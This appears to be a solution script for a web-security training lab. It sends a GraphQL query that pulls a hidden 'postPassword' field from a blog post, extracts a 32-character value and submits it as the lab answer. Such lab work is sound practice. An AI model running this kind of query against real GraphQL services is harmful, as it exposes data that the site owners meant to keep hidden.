import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
query_url = burp_url + '/graphql/v1'
answer_url = burp_url + '/submitSolution'

burp_headers = {"Content-Type": "application/json"}
burp_json={"query": "query {getBlogPost(id: 3) {postPassword}}"}
response = requests.post(query_url, headers=burp_headers, json=burp_json)
match = re.search(r'[a-z0-9]{32}', response.text)
answer = match.group(0)
print(answer)

burp_data = {"answer": answer}
requests.post(answer_url, data=burp_data)
